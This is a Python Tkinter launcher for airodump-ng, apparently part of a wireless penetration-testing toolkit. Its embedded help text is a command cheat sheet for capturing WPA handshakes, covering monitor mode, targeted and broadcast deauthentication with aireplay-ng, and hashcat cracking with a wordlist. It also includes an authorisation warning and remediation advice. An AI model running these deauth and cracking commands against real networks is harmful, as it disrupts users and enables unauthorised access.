#!/usr/bin/env python3

from tkinter import *
from datetime import datetime
import subprocess
import shlex
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from config import WORKING_DIR

#Define variables outside functions here:

info = r'''

      █████╗ ██╗██████╗  ██████╗ ██████╗ ██╗   ██╗███╗   ███╗██████╗
     ██╔══██╗██║██╔══██╗██╔═══██╗██╔══██╗██║   ██║████╗ ████║██╔══██╗
     ███████║██║██████╔╝██║   ██║██║  ██║██║   ██║██╔████╔██║██████╔╝
     ██╔══██║██║██╔══██╗██║   ██║██║  ██║██║   ██║██║╚██╔╝██║██╔═══╝
     ██║  ██║██║██║  ██║╚██████╔╝██████╔╝╚██████╔╝██║ ╚═╝ ██║██║
     ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝

airodump-ng (aircrack-ng suite)  -  the core 802.11 survey + capture tool.  Puts a
monitor-mode card to work listing every AP and client in range, then locks to one
channel/BSSID and writes a capture file.  This is the recon -> capture stage of a
wireless assessment: airodump-ng finds the targets and grabs the WPA 4-way handshake
or PMKID that wireless_hashcat / aircrack-ng then cracks.

when to use it
    - recon: full picture of SSIDs, BSSIDs, channels, encryption, client MACs, WPS
    - capture: record the 4-way handshake (with a deauth nudge) or a PMKID
    - yields capture-01.cap (+ .csv/.netxml) and the "WPA handshake: <BSSID>" banner
      top-right once a handshake is in the file
    - drives target selection (which BSSID/channel) and the crack hand-off

typical commands
    airmon-ng check kill                                         # stop NetworkManager / wpa_supplicant first
    airmon-ng start wlan0                                        # enable monitor mode -> wlan0mon
    iwconfig wlan0mon                                            # confirm "Mode:Monitor"
    airodump-ng wlan0mon                                         # survey 2.4 GHz, hop all channels
    airodump-ng wlan0mon --band abg                              # survey 2.4 + 5 GHz
    airodump-ng wlan0mon --band a                                # 5 GHz only
    airodump-ng wlan0mon --wps --manufacturer                    # extra columns: WPS state, vendor
    airodump-ng wlan0mon -w survey --output-format pcap,csv,netxml   # log everything while surveying
    # --- lock onto one target and capture the handshake ---
    airodump-ng -c 6 --bssid AA:BB:CC:11:22:33 -w capture wlan0mon   # channel 6, one AP, write capture-01.cap
    airodump-ng -c 6 --bssid AA:BB:CC:11:22:33 -w capture --ignore-negative-one wlan0mon
    # in a SECOND terminal, force a client to reconnect so its handshake is recorded:
    aireplay-ng --deauth 5 -a AA:BB:CC:11:22:33 -c 11:22:33:44:55:66 wlan0mon   # targeted (quieter)
    aireplay-ng --deauth 5 -a AA:BB:CC:11:22:33 wlan0mon                        # broadcast (louder)
    # --- verify + hand off ---
    aircrack-ng capture-01.cap                                   # "1 handshake" = success
    hcxpcapngtool -o hash.hc22000 capture-01.cap                 # convert (handshake + PMKID) for hashcat
    hashcat -m 22000 hash.hc22000 rockyou.txt -r rules/best64.rule
    airodump-ng -c 6 --bssid AA:BB:CC:11:22:33 --gpsd -w wardrive wlan0mon   # geotag while capturing
    airgraph-ng -i survey-01.csv -g CAPR -o capr.png             # visualise the survey CSV

    # buttons on this panel: 1 monitor mode = airmon-ng start wlan0 ;
    #   2 airodump = airodump-ng wlan0mon ;  3 airodump + save = adds -w <WORKING_DIR>/Airodump plus your switches

pair with
    wireless_auto_capture   scripted airmon -> airodump -> deauth -> verify
    wireless_bettercap      alternative recon / PMKID engine (wifi.recon, wifi.assoc)
    wireless_hashcat        crack the handshake / PMKID (mode 22000)
    wireless_airdecap       decrypt the traffic once you have the PSK
    wireless_airgraph / wireless_giskismet / wireless_kismapping   graph / map the CSV/netxml
    wireless_stop_monitor   airmon-ng stop wlan0mon when finished
    bruteforce_hashcat      generic crack hand-off

gotchas / de-conflict
    - needs monitor mode AND a chipset/driver that supports it (AR9271, MT7612U,
      RTL8812AU good; many onboard cards are managed-mode only)
    - NetworkManager / wpa_supplicant will channel-hop the card out from under you -
      run "airmon-ng check kill" (or systemctl stop) first
    - a channel-hopping survey rarely catches a handshake - you must lock -c <ch>
      and --bssid to reliably record one
    - 5 GHz needs a 5 GHz radio and correct regulatory domain (iw reg set <CC>);
      DFS channels may be silent; band steering can move a client to another band
      mid-capture
    - "fixed channel -1" / negative-one warnings: add --ignore-negative-one, or the
      driver is being pulled off-channel
    - PMKID capture (clientless) is often easier than a handshake - use hcxdumptool

authorisation & reporting
    - passive listening is low-risk, but the deauth you pair with it is disruptive
      and illegal without authorisation - only deauth BSSIDs/clients on a signed,
      scoped target list within the agreed window
    - keep the survey CSV/netxml and note which BSSIDs were deauthed and when
    - remediation one-liner: WPA3-SAE or 802.1X, enforce PMF / 802.11w (blocks the
      deauth nudge), disable WPS, long random PSK, and segment the WLAN (VLAN +
      firewall) so a cracked PSK yields little

dual-band survey & injection test
  dual-band airodump scan (2.4ghz + 5ghz + wps):
    sudo airodump-ng --band abg --wps wlan0mon

  test adapter packet injection:
    sudo aireplay-ng --test wlan0mon
'''

#GUI

#Creates $guibox window to populate all the gui
guibox = Tk()
guibox.title('wireless_airodump  —  airodump-ng - 802.11 capture and handshake logging')   #window title: tool name + purpose
guibox.geometry("950x900")   #size for the window guibox


#Define functions

def NEW_Terminal():
    subprocess.call(["gnome-terminal"])

def LOG(cmd):
    current_time = datetime.now()
    current_time_value = "\n" + "Time stamp: " + current_time.strftime("%d-%b-%Y (%H:%M:%S.%f)") + " - " + cmd + "\n"
    text_box.insert('end', current_time_value)
    text_box.yview('end')

def _iface():
    """The managed-mode interface from the field (e.g. wlan0)."""
    return shlex.quote(iface_entry.get().strip() or "wlan0")


def _mon():
    """The monitor-mode interface airmon-ng creates for it (e.g. wlan0mon)."""
    name = iface_entry.get().strip() or "wlan0"
    return shlex.quote(name if name.endswith("mon") else name + "mon")


def RUN_in_terminal(cmd):
    subprocess.call(['gnome-terminal -- bash -c ' + shlex.quote(cmd + ' ; exec bash')], shell=True)
    LOG(cmd)



def RUN_dual_band_survey():
    wlan = shlex.quote(iface_entry.get().strip() or "wlan0mon")
    switches = switch_entry.get()
    cmd = "sudo airodump-ng --band abg --wps " + switches + " " + wlan
    RUN_in_terminal(cmd)

def RUN_injection_test():
    wlan = shlex.quote(iface_entry.get().strip() or "wlan0mon")
    cmd = "sudo aireplay-ng --test " + wlan
    RUN_in_terminal(cmd)

def MONITOR():
    RUN_in_terminal('airmon-ng start ' + _iface())

def AIRODUMP():
    RUN_in_terminal('airodump-ng ' + _mon())

def AIRODUMP_SAVE():
    cmd = 'airodump-ng ' + _mon() + ' -w ' + shlex.quote(str(WORKING_DIR / 'Airodump')) + ' ' + switch_entry.get()
    subprocess.call(['gnome-terminal -- bash -c ' + shlex.quote(cmd)], shell = True)
    LOG(cmd)


#Grid Frames
frame_main = Frame(guibox)
frame_main.grid(row=0, column=0, columnspan=1, padx=5, pady=0, sticky="nsew")
guibox.rowconfigure(0, weight=1)
guibox.columnconfigure(0, weight=1)
frame_main.rowconfigure(1, weight=1)
frame_main.columnconfigure(0, weight=1)

frame_message = Frame(frame_main)
frame_message.grid(row=1, column=0, columnspan=1, padx=5, pady=5, sticky="nsew")

frame_buttons1 = Frame(frame_main)
frame_buttons1.grid(row=2, column=0, columnspan=8, padx=5, pady=0)

frame_buttons2 = Frame(frame_main)
frame_buttons2.grid(row=3, column=0, columnspan=8, padx=5, pady=0)

frame_buttons3 = Frame(frame_main)
frame_buttons3.grid(row=4, column=0, columnspan=8, padx=5, pady=0)

#interface
text_box = Text(
    frame_message,
    height=45,
    width=115
)
text_box.grid(row=1)

text_box.insert('end', info)
text_box.pack(side=LEFT, fill=BOTH, expand=True)
text_box.yview('1.0')

sb = Scrollbar(frame_message)
sb.pack(side=RIGHT, fill=BOTH)

text_box.config(yscrollcommand=sb.set)
sb.config(command=text_box.yview)

iface_label = Label(frame_buttons1, text="Wireless interface: ")
iface_label.grid(row=0, column=2, padx=5, pady=5)
iface_entry = Entry(frame_buttons1, width=10)
iface_entry.grid(row=0, column=3, padx=5, pady=5)
iface_entry.insert(0, os.environ.get("SKELETON_WLAN", "wlan0"))

switch_label = Label(frame_buttons1, text="airodump switches ex --channel 1 : ")
switch_label.grid(row=0, column=0, padx=5, pady=5)
switch_entry = Entry(frame_buttons1, width=30)
switch_entry.grid(row=0, column=1, padx=5, pady=5)
switch_entry.insert(0, '')

MONITOR_button = Button(frame_buttons3, text=" 1 monitor mode ", command=MONITOR)
MONITOR_button.grid(row=0, column=0, padx=5, pady=5)

AIRODUMP_button = Button(frame_buttons3, text=" 2 airodump ", command=AIRODUMP)
AIRODUMP_button.grid(row=0, column=1, padx=5, pady=5)

AIRODUMP_SAVE_button = Button(frame_buttons3, text=" 3 airodump + save ", command=AIRODUMP_SAVE)
AIRODUMP_SAVE_button.grid(row=0, column=2, padx=5, pady=5)

NEW_button = Button(frame_buttons3, text=" NEW Terminal ", command=NEW_Terminal)
NEW_button.grid(row=0, column=3, padx=5, pady=5)


DUAL_band_btn = Button(frame_buttons3, text=" 4 dual-band (--band abg --wps) ", command=RUN_dual_band_survey)
DUAL_band_btn.grid(row=0, column=4, padx=5, pady=5)

INJ_test_btn = Button(frame_buttons3, text=" 5 test injection (-9) ", command=RUN_injection_test)
INJ_test_btn.grid(row=0, column=5, padx=5, pady=5)

guibox.mainloop()   #generates guibox window
